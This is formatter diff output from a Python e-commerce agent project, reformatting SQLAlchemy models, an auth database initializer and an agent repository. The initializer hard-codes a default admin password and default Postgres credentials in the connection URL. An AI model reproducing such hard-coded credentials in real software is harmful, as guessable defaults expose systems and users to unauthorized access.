+
     # Category data
     original_category = Column(String(200), nullable=False)
     optimized_category = Column(String(200), nullable=False)
     confidence_score = Column(Numeric(3, 2), nullable=False)
     performance_improvement = Column(Numeric(5, 2), nullable=True)  # Percentage
-    
+
     # Marketplace specific
     marketplace = Column(String(50), nullable=False)
     category_path = Column(JSON, nullable=True)  # Full category hierarchy
-    
-    # Timestamps
-    created_at = Column(DateTime(timezone=True), server_default=func.now())
-    
+
+    # Timestamps
+    created_at = Column(DateTime(timezone=True), server_default=func.now())
+
     def __repr__(self):
         return f"<CategoryOptimizationResult(id={self.id}, {self.original_category} -> {self.optimized_category})>"
 
 
 class UserRewardsBalance(Base):
     """Model for tracking user rewards and earnings."""
 
     __tablename__ = "user_rewards_balance"
-    __table_args__ = {'extend_existing': True}
-    
+    __table_args__ = {"extend_existing": True}
+
     id = Column(UUID(as_uuid=True), primary_key=True, default=uuid.uuid4)
     user_id = Column(UUID(as_uuid=True), unique=True, nullable=False)
-    
+
     # Balance tracking
     current_balance = Column(Numeric(10, 2), nullable=False, default=0.00)
     lifetime_earned = Column(Numeric(10, 2), nullable=False, default=0.00)
     lifetime_redeemed = Column(Numeric(10, 2), nullable=False, default=0.00)
-    
+
     # Redemption history
     redemption_history = Column(JSON, nullable=True)
     earning_sources = Column(JSON, nullable=True)  # Track how rewards were earned
-    
-    # Timestamps
-    last_updated = Column(DateTime(timezone=True), server_default=func.now(), onupdate=func.now())
-    created_at = Column(DateTime(timezone=True), server_default=func.now())
-    
+
+    # Timestamps
+    last_updated = Column(
+        DateTime(timezone=True), server_default=func.now(), onupdate=func.now()
+    )
+    created_at = Column(DateTime(timezone=True), server_default=func.now())
+
     def __repr__(self):
         return f"<UserRewardsBalance(user_id={self.user_id}, balance=${self.current_balance})>"
 
 
 class MarketplaceCompetitiveAnalysis(Base):
     """Model for storing marketplace competitive analysis data."""
 
     __tablename__ = "marketplace_competitive_analysis"
-    __table_args__ = {'extend_existing': True}
-    
-    id = Column(UUID(as_uuid=True), primary_key=True, default=uuid.uuid4)
-    
+    __table_args__ = {"extend_existing": True}
+
+    id = Column(UUID(as_uuid=True), primary_key=True, default=uuid.uuid4)
+
     # Analysis scope
     product_category = Column(String(100), nullable=False)
     marketplace = Column(String(50), nullable=False)
     analysis_date = Column(DateTime(timezone=True), server_default=func.now())
-    
+
     # Analysis results
     competitor_data = Column(JSON, nullable=True)
     pricing_insights = Column(JSON, nullable=True)
     market_trends = Column(JSON, nullable=True)
     opportunity_score = Column(Float, nullable=True)
-    
-    # Timestamps
-    created_at = Column(DateTime(timezone=True), server_default=func.now())
-    
+
+    # Timestamps
+    created_at = Column(DateTime(timezone=True), server_default=func.now())
+
     def __repr__(self):
         return f"<MarketplaceCompetitiveAnalysis(category='{self.product_category}', marketplace='{self.marketplace}')>"
 
 
 class ListingPerformancePrediction(Base):
     """Model for storing listing performance predictions."""
 
     __tablename__ = "listing_performance_predictions"
-    __table_args__ = {'extend_existing': True}
-    
-    id = Column(UUID(as_uuid=True), primary_key=True, default=uuid.uuid4)
-    user_id = Column(UUID(as_uuid=True), nullable=False)
-    
+    __table_args__ = {"extend_existing": True}
+
+    id = Column(UUID(as_uuid=True), primary_key=True, default=uuid.uuid4)
+    user_id = Column(UUID(as_uuid=True), nullable=False)
+
     # Listing data
     listing_data = Column(JSON, nullable=False)
     marketplace = Column(String(50), nullable=False)
-    
+
     # Predictions
     predicted_views = Column(Integer, nullable=True)
     predicted_sales = Column(Integer, nullable=True)
     predicted_revenue = Column(Numeric(10, 2), nullable=True)
     confidence_score = Column(Numeric(3, 2), nullable=False)
-    
+
     # Model metadata
     prediction_model = Column(String(50), nullable=False)
     model_version = Column(String(20), nullable=True)
-    
-    # Timestamps
-    created_at = Column(DateTime(timezone=True), server_default=func.now())
-    
+
+    # Timestamps
+    created_at = Column(DateTime(timezone=True), server_default=func.now())
+
     def __repr__(self):
         return f"<ListingPerformancePrediction(id={self.id}, predicted_revenue=${self.predicted_revenue})>"
 
 
 class FeatureUsageTracking(Base):
     """Model for tracking feature usage by users."""
 
     __tablename__ = "feature_usage_tracking"
-    __table_args__ = {'extend_existing': True}
-    
-    id = Column(UUID(as_uuid=True), primary_key=True, default=uuid.uuid4)
-    user_id = Column(UUID(as_uuid=True), nullable=False)
-    
+    __table_args__ = {"extend_existing": True}
+
+    id = Column(UUID(as_uuid=True), primary_key=True, default=uuid.uuid4)
+    user_id = Column(UUID(as_uuid=True), nullable=False)
+
     # Usage details
     feature_name = Column(String(100), nullable=False)
     usage_count = Column(Integer, nullable=False, default=1)
     subscription_tier = Column(String(50), nullable=True)
-    
+
     # Usage metadata
     usage_date = Column(DateTime(timezone=True), server_default=func.now())
     usage_metadata = Column(JSON, nullable=True)
-    
-    # Timestamps
-    created_at = Column(DateTime(timezone=True), server_default=func.now())
-    
+
+    # Timestamps
+    created_at = Column(DateTime(timezone=True), server_default=func.now())
+
     def __repr__(self):
         return f"<FeatureUsageTracking(user_id={self.user_id}, feature='{self.feature_name}', count={self.usage_count})>"
 
 
 class ProductEmbedding(Base):
     """Model for storing product vector embeddings."""
 
     __tablename__ = "product_embeddings"
-    __table_args__ = {'extend_existing': True}
-    
+    __table_args__ = {"extend_existing": True}
+
     id = Column(UUID(as_uuid=True), primary_key=True, default=uuid.uuid4)
     product_id = Column(UUID(as_uuid=True), nullable=False)
-    
+
     # Embedding data
     embedding_vector = Column(JSON, nullable=False)  # Store as JSON array for now
     embedding_model = Column(String(50), nullable=False)
     vector_dimension = Column(Integer, nullable=False)
-    
+
     # Metadata
     source_data = Column(JSON, nullable=True)  # What data was used to create embedding
-    
-    # Timestamps
-    created_at = Column(DateTime(timezone=True), server_default=func.now())
-    
+
+    # Timestamps
+    created_at = Column(DateTime(timezone=True), server_default=func.now())
+
     def __repr__(self):
         return f"<ProductEmbedding(product_id={self.product_id}, model='{self.embedding_model}')>"
 
 
 # Export all models
 __all__ = [
     "AIAnalysisResult",
-    "AgentCoordinationLog", 
+    "AgentCoordinationLog",
     "ShippingArbitrageCalculation",
     "CategoryOptimizationResult",
     "UserRewardsBalance",
     "MarketplaceCompetitiveAnalysis",
     "ListingPerformancePrediction",
     "FeatureUsageTracking",
-    "ProductEmbedding"
+    "ProductEmbedding",
 ]
would reformat /home/brend/Flipsync_Final/fs_agt_clean/database/models/ai_analysis.py
--- /home/brend/Flipsync_Final/fs_agt_clean/database/init_auth_db.py	2025-06-14 20:35:30.807778+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/database/init_auth_db.py	2025-06-19 04:04:00.269710+00:00
@@ -22,330 +22,388 @@
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
 # Database configuration
 DATABASE_URL = os.getenv(
-    "DATABASE_URL", 
-    "postgresql+asyncpg://postgres:postgres@localhost:1432/flipsync"
+    "DATABASE_URL", "postgresql+asyncpg://postgres:postgres@localhost:1432/flipsync"
 )
+
 
 class DatabaseInitializer:
     """
     AGENT_CONTEXT: Database initialization and setup for authentication system
     AGENT_CAPABILITY: Create tables, seed data, manage database schema
     """
-    
+
     def __init__(self, database_url: str = DATABASE_URL):
         """Initialize database connection"""
         self.database_url = database_url
         self.engine = create_async_engine(
-            database_url,
-            echo=True,  # Log SQL statements
-            future=True
+            database_url, echo=True, future=True  # Log SQL statements
         )
         self.async_session = sessionmaker(
-            self.engine, 
-            class_=AsyncSession, 
-            expire_on_commit=False
+            self.engine, class_=AsyncSession, expire_on_commit=False
         )
 
     async def create_tables(self) -> None:
         """Create all authentication tables"""
         logger.info("Creating authentication database tables...")
-        
+
         async with self.engine.begin() as conn:
             # Create all tables defined in Base metadata
             await conn.run_sync(Base.metadata.create_all)
-        
+
         logger.info(" Authentication tables created successfully")
 
     async def create_default_roles(self) -> None:
         """Create default roles for the system"""
         logger.info("Creating default roles...")
-        
+
         default_roles = [
-            {
-                "name": "admin",
-                "description": "System administrator with full access"
-            },
-            {
-                "name": "user", 
-                "description": "Regular user with standard access"
-            },
-            {
-                "name": "agent",
-                "description": "AI agent with automated access"
-            },
-            {
-                "name": "viewer",
-                "description": "Read-only access to system"
-            }
+            {"name": "admin", "description": "System administrator with full access"},
+            {"name": "user", "description": "Regular user with standard access"},
+            {"name": "agent", "description": "AI agent with automated access"},
+            {"name": "viewer", "description": "Read-only access to system"},
         ]
-        
+
         async with self.async_session() as session:
             for role_data in default_roles:
                 # Check if role already exists
                 existing_role = await session.execute(
                     text("SELECT id FROM roles WHERE name = :name"),
-                    {"name": role_data["name"]}
+                    {"name": role_data["name"]},
                 )
-                
+
                 if not existing_role.first():
                     role = Role(
-                        name=role_data["name"],
-                        description=role_data["description"]
+                        name=role_data["name"], description=role_data["description"]
                     )
                     session.add(role)
                     logger.info(f"Created role: {role_data['name']}")
                 else:
                     logger.info(f"Role already exists: {role_data['name']}")
-            
+
             await session.commit()
-        
+
         logger.info(" Default roles created successfully")
 
     async def create_default_permissions(self) -> None:
         """Create default permissions for the system"""
         logger.info("Creating default permissions...")
-        
+
         default_permissions = [
             # User management
-            {"name": "users.read", "description": "Read user information", "resource": "users", "action": "read"},
-            {"name": "users.write", "description": "Create and update users", "resource": "users", "action": "write"},
-            {"name": "users.delete", "description": "Delete users", "resource": "users", "action": "delete"},
-            
+            {
+                "name": "users.read",
+                "description": "Read user information",
+                "resource": "users",
+                "action": "read",
+            },
+            {
+                "name": "users.write",
+                "description": "Create and update users",
+                "resource": "users",
+                "action": "write",
+            },
+            {
+                "name": "users.delete",
+                "description": "Delete users",
+                "resource": "users",
+                "action": "delete",
+            },
             # Product management
-            {"name": "products.read", "description": "Read product information", "resource": "products", "action": "read"},
-            {"name": "products.write", "description": "Create and update products", "resource": "products", "action": "write"},
-            {"name": "products.delete", "description": "Delete products", "resource": "products", "action": "delete"},
-            
+            {
+                "name": "products.read",
+                "description": "Read product information",
+                "resource": "products",
+                "action": "read",
+            },
+            {
+                "name": "products.write",
+                "description": "Create and update products",
+                "resource": "products",
+                "action": "write",
+            },
+            {
+                "name": "products.delete",
+                "description": "Delete products",
+                "resource": "products",
+                "action": "delete",
+            },
             # Inventory management
-            {"name": "inventory.read", "description": "Read inventory information", "resource": "inventory", "action": "read"},
-            {"name": "inventory.write", "description": "Update inventory", "resource": "inventory", "action": "write"},
-            
+            {
+                "name": "inventory.read",
+                "description": "Read inventory information",
+                "resource": "inventory",
+                "action": "read",
+            },
+            {
+                "name": "inventory.write",
+                "description": "Update inventory",
+                "resource": "inventory",
+                "action": "write",
+            },
             # Analytics and reports
-            {"name": "analytics.read", "description": "View analytics and reports", "resource": "analytics", "action": "read"},
-            
+            {
+                "name": "analytics.read",
+                "description": "View analytics and reports",
+                "resource": "analytics",
+                "action": "read",
+            },
             # System administration
-            {"name": "admin.full", "description": "Full administrative access", "resource": "system", "action": "admin"},
-            
+            {
+                "name": "admin.full",
+                "description": "Full administrative access",
+                "resource": "system",
+                "action": "admin",
+            },
             # API access
-            {"name": "api.access", "description": "Access to API endpoints", "resource": "api", "action": "access"},
+            {
+                "name": "api.access",
+                "description": "Access to API endpoints",
+                "resource": "api",
+                "action": "access",
+            },
         ]
-        
+
         async with self.async_session() as session:
             for perm_data in default_permissions:
                 # Check if permission already exists
                 existing_perm = await session.execute(
                     text("SELECT id FROM permissions WHERE name = :name"),
-                    {"name": perm_data["name"]}
+                    {"name": perm_data["name"]},
                 )
-                
+
                 if not existing_perm.first():
                     permission = Permission(
                         name=perm_data["name"],
                         description=perm_data["description"],
                         resource=perm_data["resource"],
-                        action=perm_data["action"]
+                        action=perm_data["action"],
                     )
                     session.add(permission)
                     logger.info(f"Created permission: {perm_data['name']}")
                 else:
                     logger.info(f"Permission already exists: {perm_data['name']}")
-            
+
             await session.commit()
-        
+
         logger.info(" Default permissions created successfully")
 
     async def assign_role_permissions(self) -> None:
         """Assign permissions to roles"""
         logger.info("Assigning permissions to roles...")
-        
+
         role_permissions = {
             "admin": [
-                "users.read", "users.write", "users.delete",
-                "products.read", "products.write", "products.delete",
-                "inventory.read", "inventory.write",
-                "analytics.read", "admin.full", "api.access"
+                "users.read",
+                "users.write",
+                "users.delete",
+                "products.read",
+                "products.write",
+                "products.delete",
+                "inventory.read",
+                "inventory.write",
+                "analytics.read",
+                "admin.full",
+                "api.access",
             ],
-            "user": [
-                "products.read", "inventory.read", "analytics.read", "api.access"
+            "user": ["products.read", "inventory.read", "analytics.read", "api.access"],
+            "agent": [
+                "products.read",
+                "products.write",
+                "inventory.read",
+                "inventory.write",
+                "analytics.read",
+                "api.access",
             ],
-            "agent": [
-                "products.read", "products.write", "inventory.read", 
-                "inventory.write", "analytics.read", "api.access"
-            ],
-            "viewer": [
-                "products.read", "inventory.read", "analytics.read"
-            ]
+            "viewer": ["products.read", "inventory.read", "analytics.read"],
         }
-        
+
         async with self.async_session() as session:
             for role_name, permission_names in role_permissions.items():
                 # Get role
                 role_result = await session.execute(
-                    text("SELECT id FROM roles WHERE name = :name"),
-                    {"name": role_name}
+                    text("SELECT id FROM roles WHERE name = :name"), {"name": role_name}
                 )
                 role_row = role_result.first()
-                
+
                 if not role_row:
                     logger.warning(f"Role not found: {role_name}")
                     continue
-                
+
                 role_id = role_row[0]
-                
+
                 for perm_name in permission_names:
                     # Get permission
                     perm_result = await session.execute(
                         text("SELECT id FROM permissions WHERE name = :name"),
-                        {"name": perm_name}
+                        {"name": perm_name},
                     )
                     perm_row = perm_result.first()
-                    
+
                     if not perm_row:
                         logger.warning(f"Permission not found: {perm_name}")
                         continue
-                    
+
                     perm_id = perm_row[0]
-                    
+
                     # Check if assignment already exists
                     existing = await session.execute(
-                        text("SELECT 1 FROM role_permissions WHERE role_id = :role_id AND permission_id = :perm_id"),
-                        {"role_id": role_id, "perm_id": perm_id}
+                        text(
+                            "SELECT 1 FROM role_permissions WHERE role_id = :role_id AND permission_id = :perm_id"
+                        ),
+                        {"role_id": role_id, "perm_id": perm_id},
                     )
-                    
+
                     if not existing.first():
                         # Create assignment
                         await session.execute(
-                            text("INSERT INTO role_permissions (role_id, permission_id) VALUES (:role_id, :perm_id)"),
-                            {"role_id": role_id, "perm_id": perm_id}
+                            text(
+                                "INSERT INTO role_permissions (role_id, permission_id) VALUES (:role_id, :perm_id)"
+                            ),
+                            {"role_id": role_id, "perm_id": perm_id},
                         )
                         logger.info(f"Assigned {perm_name} to {role_name}")
-            
+
             await session.commit()
-        
+
         logger.info(" Role permissions assigned successfully")
 
     async def create_admin_user(self) -> None:
         """Create default admin user"""
         logger.info("Creating default admin user...")
-        
+
         admin_email = "admin@flipsync.com"
         admin_username = "admin"
         admin_password = "FlipSync2024!"  # Change this in production!
-        
+
         async with self.async_session() as session:
             # Check if admin user already exists
             existing_user = await session.execute(
-                text("SELECT id FROM auth_users WHERE email = :email OR username = :username"),
-                {"email": admin_email, "username": admin_username}
-            )
-            
+                text(
+                    "SELECT id FROM auth_users WHERE email = :email OR username = :username"
+                ),
+                {"email": admin_email, "username": admin_username},
+            )
+
             if existing_user.first():
                 logger.info("Admin user already exists")
                 return
-            
+
             # Create admin user
             admin_user = AuthUser(
                 email=admin_email,
                 username=admin_username,
                 password=admin_password,
                 first_name="System",
                 last_name="Administrator",
                 is_active=True,
                 is_verified=True,
-                is_admin=True
-            )
-            
+                is_admin=True,
+            )
+
             session.add(admin_user)
             await session.flush()  # Get the user ID
-            
+
             # Assign admin role
             admin_role_result = await session.execute(
                 text("SELECT id FROM roles WHERE name = 'admin'")
             )
             admin_role_row = admin_role_result.first()
-            
+
             if admin_role_row:
                 await session.execute(
-                    text("INSERT INTO user_roles (user_id, role_id) VALUES (:user_id, :role_id)"),
-                    {"user_id": admin_user.id, "role_id": admin_role_row[0]}
+                    text(
+                        "INSERT INTO user_roles (user_id, role_id) VALUES (:user_id, :role_id)"
+                    ),
+                    {"user_id": admin_user.id, "role_id": admin_role_row[0]},
                 )
-            
+
             await session.commit()
-            
+
             logger.info(f" Admin user created: {admin_email}")
             logger.warning(f"  Default password: {admin_password}")
             logger.warning(" CHANGE THE DEFAULT PASSWORD IMMEDIATELY!")
 
     async def initialize_database(self) -> None:
         """Run complete database initialization"""
         logger.info(" Starting FlipSync authentication database initialization...")
-        
+
         try:
             await self.create_tables()
             await self.create_default_roles()
             await self.create_default_permissions()
             await self.assign_role_permissions()
             await self.create_admin_user()
-            
+
             logger.info(" Database initialization completed successfully!")
-            
+
         except Exception as e:
             logger.error(f" Database initialization failed: {str(e)}")
             raise
-        
+
         finally:
             await self.engine.dispose()
 
     async def verify_setup(self) -> None:
         """Verify database setup is working"""
         logger.info(" Verifying database setup...")
-        
+
         async with self.async_session() as session:
             # Count tables
             tables_result = await session.execute(
-                text("SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = 'public' AND table_name IN ('auth_users', 'roles', 'permissions', 'user_roles', 'user_permissions', 'role_permissions')")
+                text(
+                    "SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = 'public' AND table_name IN ('auth_users', 'roles', 'permissions', 'user_roles', 'user_permissions', 'role_permissions')"
+                )
             )
             table_count = tables_result.scalar()
-            
+
             # Count users
-            users_result = await session.execute(text("SELECT COUNT(*) FROM auth_users"))
+            users_result = await session.execute(
+                text("SELECT COUNT(*) FROM auth_users")
+            )
             user_count = users_result.scalar()
-            
+
             # Count roles
             roles_result = await session.execute(text("SELECT COUNT(*) FROM roles"))
             role_count = roles_result.scalar()
-            
+
             # Count permissions
-            perms_result = await session.execute(text("SELECT COUNT(*) FROM permissions"))
+            perms_result = await session.execute(
+                text("SELECT COUNT(*) FROM permissions")
+            )
             perm_count = perms_result.scalar()
-            
+
             logger.info(f" Database verification results:")
             logger.info(f"   Tables: {table_count}/6")
             logger.info(f"   Users: {user_count}")
             logger.info(f"   Roles: {role_count}")
             logger.info(f"   Permissions: {perm_count}")
-            
-            if table_count == 6 and user_count > 0 and role_count > 0 and perm_count > 0:
+
+            if (
+                table_count == 6
+                and user_count > 0
+                and role_count > 0
+                and perm_count > 0
+            ):
                 logger.info(" Database setup verification passed!")
             else:
                 logger.error(" Database setup verification failed!")
 
 
 async def main():
     """Main initialization function"""
     initializer = DatabaseInitializer()
-    
+
     try:
         await initializer.initialize_database()
         await initializer.verify_setup()
     except Exception as e:
         logger.error(f"Initialization failed: {str(e)}")
         return 1
-    
+
     return 0
 
 
 if __name__ == "__main__":
     # AGENT_CONTEXT: Standalone database initialization execution
would reformat /home/brend/Flipsync_Final/fs_agt_clean/database/init_auth_db.py
--- /home/brend/Flipsync_Final/fs_agt_clean/database/repositories/agent_repository.py	2025-06-14 20:35:30.811786+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/database/repositories/agent_repository.py	2025-06-19 04:04:00.731402+00:00
@@ -11,12 +11,15 @@
 
 from sqlalchemy import select, desc, func, and_
 from sqlalchemy.ext.asyncio import AsyncSession
 
 from fs_agt_clean.database.models.agents import (
-    AgentStatus, AgentDecision, AgentPerformanceMetric, 
-    AgentCommunication, AgentTask
+    AgentStatus,
+    AgentDecision,
+    AgentPerformanceMetric,
+    AgentCommunication,
+    AgentTask,
 )
 from fs_agt_clean.database.base_repository import BaseRepository
 
 
 class AgentRepository(BaseRepository):
@@ -31,67 +34,65 @@
         session: AsyncSession,
         agent_id: str,
         agent_type: str,
         status: str,
         metrics: Optional[Dict[str, Any]] = None,
-        config: Optional[Dict[str, Any]] = None
+        config: Optional[Dict[str, Any]] = None,
     ) -> AgentStatus:
         """Create or update agent status.
-        
+
         Args:
             session: Database session
             agent_id: Unique identifier for the agent
             agent_type: Type of agent ('market', 'executive', etc.)
             status: Current status ('running', 'stopped', 'error', etc.)
             metrics: Optional performance metrics
             config: Optional agent configuration
-            
+
         Returns:
             Created or updated agent status
         """
         # Check if agent status already exists
         existing_query = select(AgentStatus).where(AgentStatus.agent_id == agent_id)
         result = await session.execute(existing_query)
         existing_status = result.scalar_one_or_none()
-        
+
         if existing_status:
             # Update existing status
             existing_status.status = status
             existing_status.agent_type = agent_type
             existing_status.metrics = metrics or existing_status.metrics
             existing_status.config = config or existing_status.config
             existing_status.last_heartbeat = datetime.now(timezone.utc)
-            
+
             await session.commit()
             await session.refresh(existing_status)
             return existing_status
         else:
             # Create new status
             agent_status = AgentStatus(
                 agent_id=agent_id,
                 agent_type=agent_type,
                 status=status,
                 metrics=metrics or {},
-                config=config or {}
+                config=config or {},
             )
-            
+
             session.add(agent_status)
             await session.commit()
             await session.refresh(agent_status)
             return agent_status
 
     async def get_agent_status(
-        self,
-        session: AsyncSession,
-        agent_id: str
+        self, session: AsyncSession, agent_id: str
     ) -> Optional[AgentStatus]:
         """Get agent status by ID.
-        
+
         Args:
             session: Database session
             agent_id: ID of the agent
-            
+
         Returns:
             Agent status if found, None otherwise
         """
         query = select(AgentStatus).where(AgentStatus.agent_id == agent_id)
         result = await session.execute(query)
@@ -99,129 +100,128 @@
 
     async def get_all_agent_statuses(
         self,
         session: AsyncSession,
         agent_type: Optional[str] = None,
-        status: Optional[str] = None
+        status: Optional[str] = None,
     ) -> List[AgentStatus]:
         """Get all agent statuses with optional filtering.
-        
+
         Args:
             session: Database session
             agent_type: Optional filter by agent type
             status: Optional filter by status
-            
+
         Returns:
             List of agent statuses
         """
-        query = select(AgentStatus).order_by(AgentStatus.agent_type, AgentStatus.agent_id)
-        
+        query = select(AgentStatus).order_by(
+            AgentStatus.agent_type, AgentStatus.agent_id
+        )
+
         if agent_type:
             query = query.where(AgentStatus.agent_type == agent_type)
-        
+
         if status:
             query = query.where(AgentStatus.status == status)
-        
+
         result = await session.execute(query)
         return result.scalars().all()
 
     async def create_agent_decision(
         self,
         session: AsyncSession,
         agent_id: str,
         decision_type: str,
         parameters: Optional[Dict[str, Any]] = None,
         confidence: Optional[float] = None,
-        rationale: Optional[str] = None
+        rationale: Optional[str] = None,
     ) -> AgentDecision:
         """Create a new agent decision.
-        
+
         Args:
             session: Database session
             agent_id: ID of the agent making the decision
             decision_type: Type of decision ('pricing', 'inventory', etc.)
             parameters: Decision parameters
             confidence: Confidence level (0.0 to 1.0)
             rationale: Explanation for the decision
-            
+
         Returns:
             Created agent decision
         """
         decision = AgentDecision(
             agent_id=agent_id,
             decision_type=decision_type,
             parameters=parameters or {},
             confidence=confidence,
             rationale=rationale,
-            status="pending"
-        )
-        
+            status="pending",
+        )
+
         session.add(decision)
         await session.commit()
         await session.refresh(decision)
-        
+
         return decision
 
     async def get_pending_decisions(
         self,
         session: AsyncSession,
         agent_id: Optional[str] = None,
-        decision_type: Optional[str] = None
+        decision_type: Optional[str] = None,
     ) -> List[AgentDecision]:
         """Get pending agent decisions.
-        
+
         Args:
             session: Database session
             agent_id: Optional filter by agent ID
             decision_type: Optional filter by decision type
-            
+
         Returns:
             List of pending decisions
         """
         query = (
             select(AgentDecision)
             .where(AgentDecision.status == "pending")
             .order_by(desc(AgentDecision.created_at))
         )
-        
+
         if agent_id:
             query = query.where(AgentDecision.agent_id == agent_id)
-        
+
         if decision_type:
             query = query.where(AgentDecision.decision_type == decision_type)
-        
+
         result = await session.execute(query)
         return result.scalars().all()
 
     async def approve_decision(
-        self,
-        session: AsyncSession,
-        decision_id: str,
-        approved_by: str
+        self, session: AsyncSession, decision_id: str, approved_by: str
     ) -> Optional[AgentDecision]:
         """Approve an agent decision.
-        
+
         Args:
             session: Database session
             decision_id: ID of the decision to approve
             approved_by: ID of the user approving the decision
-            
+
         Returns:
             Updated decision if found, None otherwise
         """
         query = select(AgentDecision).where(AgentDecision.id == uuid.UUID(decision_id))
         result = await session.execute(query)
         decision = result.scalar_one_or_none()
-        
+
         if decision:
             decision.status = "approved"
             decision.approved_at = datetime.now(timezone.utc)
             decision.approved_by = uuid.UUID(approved_by)
-            
+
             await session.commit()
             await session.refresh(decision)
-        
+
         return decision
 
     async def log_agent_decision(
         self,
         session: AsyncSession,
@@ -229,11 +229,11 @@
         agent_type: str,
         decision_type: str,
         parameters: Optional[Dict[str, Any]] = None,
         confidence: Optional[float] = None,
         rationale: Optional[str] = None,
-        requires_approval: bool = False
+        requires_approval: bool = False,
     ) -> AgentDecision:
         """Log an agent decision for tracking and audit purposes.
 
         Args:
             session: Database session
@@ -252,178 +252,175 @@
             agent_id=agent_id,
             decision_type=decision_type,
             parameters=parameters or {},
             confidence=confidence,
             rationale=rationale,
-            status="approved" if not requires_approval else "pending"
+            status="approved" if not requires_approval else "pending",
         )
 
         session.add(decision)
         await session.commit()
         await session.refresh(decision)
 
         return decision
 
     async def reject_decision(
-        self,
-        session: AsyncSession,
-        decision_id: str,
-        approved_by: str
+        self, session: AsyncSession, decision_id: str, approved_by: str
     ) -> Optional[AgentDecision]:
         """Reject an agent decision.
-        
+
         Args:
             session: Database session
             decision_id: ID of the decision to reject
             approved_by: ID of the user rejecting the decision
-            
+
         Returns:
             Updated decision if found, None otherwise
         """
         query = select(AgentDecision).where(AgentDecision.id == uuid.UUID(decision_id))
         result = await session.execute(query)
         decision = result.scalar_one_or_none()
-        
+
         if decision:
             decision.status = "rejected"
             decision.approved_at = datetime.now(timezone.utc)
             decision.approved_by = uuid.UUID(approved_by)
-            
+
             await session.commit()
             await session.refresh(decision)
-        
+
         return decision
 
     async def record_performance_metric(
         self,
         session: AsyncSession,
         agent_id: str,
         metric_name: str,
         metric_value: float,
         metric_unit: Optional[str] = None,
-        metadata: Optional[Dict[str, Any]] = None
+        metadata: Optional[Dict[str, Any]] = None,
     ) -> AgentPerformanceMetric:
         """Record a performance metric for an agent.
-        
+
         Args:
             session: Database session
             agent_id: ID of the agent
             metric_name: Name of the metric
             metric_value: Value of the metric
             metric_unit: Optional unit of measurement
             metadata: Optional additional metadata
-            
+
         Returns:
             Created performance metric
         """
         metric = AgentPerformanceMetric(
             agent_id=agent_id,
             metric_name=metric_name,
             metric_value=metric_value,
             metric_unit=metric_unit,
-            extra_metadata=metadata or {}
-        )
-        
+            extra_metadata=metadata or {},
+        )
+
         session.add(metric)
         await session.commit()
         await session.refresh(metric)
-        
+
         return metric
 
     async def get_agent_metrics(
         self,
         session: AsyncSession,
         agent_id: str,
         metric_name: Optional[str] = None,
-        limit: int = 100
+        limit: int = 100,
     ) -> List[AgentPerformanceMetric]:
         """Get performance metrics for an agent.
-        
+
         Args:
             session: Database session
             agent_id: ID of the agent
             metric_name: Optional filter by metric name
             limit: Maximum number of metrics to return
-            
+
         Returns:
             List of performance metrics
         """
         query = (
             select(AgentPerformanceMetric)
             .where(AgentPerformanceMetric.agent_id == agent_id)
             .order_by(desc(AgentPerformanceMetric.timestamp))
             .limit(limit)
         )
-        
+
         if metric_name:
             query = query.where(AgentPerformanceMetric.metric_name == metric_name)
-        
+
         result = await session.execute(query)
         return result.scalars().all()
 
     async def create_agent_task(
         self,
         session: AsyncSession,
         agent_id: str,
         task_type: str,
         task_name: str,
         task_parameters: Optional[Dict[str, Any]] = None,
-        priority: int = 5
+        priority: int = 5,
     ) -> AgentTask:
         """Create a new agent task.
-        
+
         Args:
             session: Database session
             agent_id: ID of the agent
             task_type: Type of task
             task_name: Name of the task
             task_parameters: Optional task parameters
             priority: Task priority (1-10, where 1 is highest)
-            
+
         Returns:
             Created agent task
         """
         task = AgentTask(
             agent_id=agent_id,
             task_type=task_type,
             task_name=task_name,
             task_parameters=task_parameters or {},
             priority=priority,
-            status="queued"
-        )
-        
+            status="queued",
+        )
+
         session.add(task)
         await session.commit()
         await session.refresh(task)
-        
+
         return task
 
     async def get_agent_tasks(
         self,
         session: AsyncSession,
         agent_id: str,
         status: Optional[str] = None,
-        limit: int = 50
+        limit: int = 50,
     ) -> List[AgentTask]:
         """Get tasks for an agent.
-        
+
         Args:
             session: Database session
             agent_id: ID of the agent
             status: Optional filter by status
             limit: Maximum number of tasks to return
-            
+
         Returns:
             List of agent tasks
         """
         query = (
             select(AgentTask)
             .where(AgentTask.agent_id == agent_id)
             .order_by(AgentTask.priority, desc(AgentTask.created_at))
             .limit(limit)
         )
-        
+
         if status:
             query = query.where(AgentTask.status == status)
-        
+
         result = await session.execute(query)
         return result.scalars().all()
would reformat /home/brend/Flipsync_Final/fs_agt_clean/database/repositories/agent_repository.py
--- /home/brend/Flipsync_Final/fs_agt_clean/database/models/metrics.py	2025-06-14 20:35:30.811786+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/database/models/metrics.py	2025-06-19 04:04:00.724083+00:00
@@ -6,12 +6,22 @@
 """
 
 from datetime import datetime, timezone
 from typing import Dict, Any, Optional
 from sqlalchemy import (
-    Column, String, Float, Integer, DateTime, Text, JSON, Boolean, Index,
-    ForeignKey, Enum as SQLEnum, BigInteger
+    Column,
+    String,
+    Float,
+    Integer,
+    DateTime,
+    Text,
+    JSON,
+    Boolean,
+    Index,
+    ForeignKey,
+    Enum as SQLEnum,
+    BigInteger,
 )
 from sqlalchemy.orm import relationship
 from sqlalchemy.dialects.postgresql import UUID
 import uuid
 import enum
@@ -19,18 +29,20 @@
 from fs_agt_clean.database.models.base import Base
 
 
 class MetricType(enum.Enum):
     """Types of metrics."""
+
     GAUGE = "gauge"
     COUNTER = "counter"
     HISTOGRAM = "histogram"
     SUMMARY = "summary"
 
 
 class MetricCategory(enum.Enum):
     """Categories of metrics."""
+
     SYSTEM = "system"
     PERFORMANCE = "performance"
     BUSINESS = "business"
     SECURITY = "security"
     AGENT = "agent"
@@ -40,18 +52,20 @@
     API = "api"
 
 
 class AlertLevel(enum.Enum):
     """Alert levels."""
+
     INFO = "info"
     WARNING = "warning"
     ERROR = "error"
     CRITICAL = "critical"
 
 
 class AlertCategory(enum.Enum):
     """Alert categories."""
+
     SYSTEM = "system"
     PERFORMANCE = "performance"
     SECURITY = "security"
     BUSINESS = "business"
     AGENT = "agent"
@@ -61,10 +75,11 @@
     API = "api"
 
 
